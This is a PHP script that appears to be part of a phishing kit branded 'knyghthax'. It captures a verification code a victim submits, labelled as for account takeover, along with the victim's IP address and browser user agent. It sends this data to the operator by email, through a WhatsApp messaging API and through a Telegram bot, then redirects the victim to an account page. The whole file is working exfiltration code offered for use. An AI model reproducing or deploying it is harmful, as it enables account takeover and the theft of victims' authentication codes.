<?php

error_reporting(0);
session_start();
include "../../admin/setting/rezlts_settings/bot_settings.php";
$ipaddress = getenv('REMOTE_ADDR');
$useragent=$_SERVER['HTTP_USER_AGENT'];
$message = "[==========   ATO Code 1st  ===========]\r\n";
$message .= "|Code 1     : ".$_POST['cd']."\r\n";

$message .= "|UserAgent:   $useragent   ]\r\n";
$message .= "Ip: ====: $ipaddress :====\r\n";

$message .= "--------------- $C4MP4G3 By knyghthax.com -----------------\n";
$send = $email; 
$subject = "♠️ (".$_POST['login'].")  RZLT ♠️ $ip";
$headers = "From: [KNYGHT]";
mail($send,$subject,$message,$headers);
$url='https://api.callmebot.com/whatsapp.php?source=php&phone='.$phone.'&text='.urlencode($message).'&apikey='.$apikey;
$html=file_get_contents($url);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


    echo '<script>window.location.href = "../../account/";</script>';
   

?>
